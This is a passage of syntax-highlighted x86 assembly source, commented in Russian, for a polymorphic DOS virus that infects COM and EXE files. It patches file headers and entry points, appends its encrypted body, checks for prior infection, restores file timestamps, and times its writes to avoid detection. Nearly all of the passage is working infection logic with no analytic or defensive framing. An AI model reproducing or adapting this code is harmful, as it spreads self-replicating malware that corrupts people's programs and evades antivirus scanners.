▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">Infect_Handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; ds и es показывают на нас</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HandleCheck</span><span class="sc0">     </span><span class="sc1">; проверка файла на фиктивность (disk file?)</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Inf_Check</span><span class="sc0">       </span><span class="sc1">; проверка файла на повторное заражение</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">           </span><span class="sc1">; чтение заголовка файла</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">original</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; DOS вернул все запрошенные для</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">           </span><span class="sc1">; чтения байты?</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">original</span><span class="sc0">     </span><span class="sc1">; сделать копию оригинального</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">header</span><span class="sc0">       </span><span class="sc1">; начала программы</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; взять в ax первые 2 байта заголовка</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">         </span><span class="sc1">; проверка на EXE тип</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exeinfect</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">         </span><span class="sc1">; таких EXEшников я никогда не видел</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exeinfect</span><span class="sc0">       </span><span class="sc1">; но говорят такие бывают</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; инфицирование COM файла</span><span class="sc0">
</span><span class="sc1">; DI - заголовок, который нужно модифицировать</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2eof</span><span class="sc0">        </span><span class="sc1">; получение размера файла</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; размер файла больше 65535 байт?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">65035</span><span class="sc4">-</span><span class="sc5">vsize</span><span class="sc0">  </span><span class="sc1">; проверка файла на переполнение</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">Close</span><span class="sc0">           </span><span class="sc1">; место еще оставлено под стек и PSP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">     </span><span class="sc1">; запись JMP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">delta</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; дополнительное смещение для полиморфа</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; коррекция (минус размер jump'а)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; запись адреса перехода</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">check</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; инфицирование EXE файла</span><span class="sc0">
</span><span class="sc1">; DI - заголовок, который нужно модифицировать</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">exeinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc12">'@'</span><span class="sc0">  </span><span class="sc1">; проверка файла на принадлежность</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Close</span><span class="sc0">           </span><span class="sc1">; к новому семейству WinNE файлов</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; считать параметр PageCnt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; считать параметр PartPag</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; если длина последней страницы равна</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">             </span><span class="sc1">; нулю, то параметр PageCnt не содержит</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; дополнительной единицы</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">          </span><span class="sc1">; умножение на 512 (получение байт)</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; получение длины из EXE файла, которая</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; грузится в память при запуске это EXE</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; сохранить пареметр в стеке</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2eof</span><span class="sc0">        </span><span class="sc1">; получение дискового размера файла</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; загрузка параметров из стека</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; сравнение параметров (выявление</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Close</span><span class="sc0">           </span><span class="sc1">; всяких overlay структур)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Close</span><span class="sc0">           </span><span class="sc1">; очень большие файлы нам не подходят</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">           </span><span class="sc1">; как они в память грузяться??? но такие</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">Close</span><span class="sc0">           </span><span class="sc1">; бывают (случается divide overflow ниже)</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; сохранение параметров</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">           </span><span class="sc1">; получение входной точки (CS:IP), которые</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; расположены в конце чистого EXE файла</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; вычитание размера EXE заголовка</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">delta</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">; дополнительное смещение для полиморфа</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; подобие COM файлу (IP больше/равно 100h)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">   </span><span class="sc1">; сохранение IP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; сохранение CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; сохранение SS (ой TBSCAN заорет)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],-</span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; сохранение SP</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; загрузка параметров из стека</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">        </span><span class="sc1">; добавление к размеру файла</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; длины вируса</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">          </span><span class="sc1">; считаем новые PartPag и PageCnt для</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; файла вместе с вирусом</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; сохранение PartPag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; сохранение PageCnt</span><span class="sc0">

 </span><span class="sc5">Check</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteVirus</span><span class="sc0">      </span><span class="sc1">; запись вирус в файл</span><span class="sc0">

 </span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CorrectDate</span><span class="sc0">     </span><span class="sc1">; правка даты инфицированного файла</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; запись зашифрованного тела вируса в файл</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">writevirus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDate</span><span class="sc0">         </span><span class="sc1">; запрос времени/даты файла</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">save_ax</span><span class="sc4">,</span><span class="sc2">1857h</span><span class="sc1">; проверка необходимости порверки</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_time</span><span class="sc0">         </span><span class="sc1">; времени файла</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">          </span><span class="sc1">; запрос текущего времени</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; в dx:cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">time</span><span class="sc0">      </span><span class="sc1">; в ax время файла</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; берем часы (биты 11-15 в cx)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">           </span><span class="sc1">; совпадают? если да, то съябываемся,</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">write_fail</span><span class="sc0">      </span><span class="sc1">; чтобы не засветиться</span><span class="sc0">
 </span><span class="sc5">no_time</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2eof</span><span class="sc0">        </span><span class="sc1">; -&gt; конец</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">nexus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write</span><span class="sc0">           </span><span class="sc1">; записываемся в файл</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; все записалось?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">write_fail</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2bof</span><span class="sc0">        </span><span class="sc1">; идем в начало</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">           </span><span class="sc1">; заголовок com/exe файла</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">header</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write</span><span class="sc0">

  </span><span class="sc5">write_fail</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestDate</span><span class="sc0">        </span><span class="sc1">; восстановление даты файла</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; проверка файла на инфицированность</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">Inf_Check</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">         </span><span class="sc1">; сохранить в стеке регистры</span><span class="sc0">

       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SeekSave</span><span class="sc0">         </span><span class="sc1">; сохраняем позицию lseek</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; переносим указатель на начало</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc5">vsize</span><span class="sc0">        </span><span class="sc1">; тела вируса</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_eof</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">         </span><span class="sc1">; читаем дескриптор в буфер</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">

       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestoreSeek</span><span class="sc0">      </span><span class="sc1">; восстановить позицию lseek</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; все прочиталось?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">

       </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">v_id</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+(</span><span class="sc5">signature</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ssize</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">

       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">not_infected</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; CRLOAD - подпрограмма для получения оригинального начала</span><span class="sc0">
</span><span class="sc1">; зараженной программы из зашифрованного вируса в этой программе</span><span class="sc0">
</span><span class="sc1">; вход: BX - handle инфицированной программы</span><span class="sc0">
</span><span class="sc1">; выход: "buffer" содержит 32 оригинальных байта</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">crload</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; инициализация сегментных регистров</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; сохранение позиции указателя в файле</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_cur</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; идем к голове вируса (т.к. вирус записан</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc5">vsize</span><span class="sc0">       </span><span class="sc1">; в конце программы, его начало будет распо-</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_eof</span><span class="sc0">    </span><span class="sc1">; ложено на VSIZE байт от конца файла)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">        </span><span class="sc1">; читаем зашифрованный вирус</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">       </span><span class="sc1">; в буфер</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; восстанавливаем позицию указателя</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_bof</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">w</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+(</span><span class="sc5">nex_ptr</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; чтение расшифровщика</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">111b</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">101b</span><span class="sc0">         </span><span class="sc1">; расшифровка с регистром DI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc5">do_enc</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10b</span><span class="sc0">          </span><span class="sc1">; проверка необходимости ключа</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; чтение ключа</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">_key</span><span class="sc0">
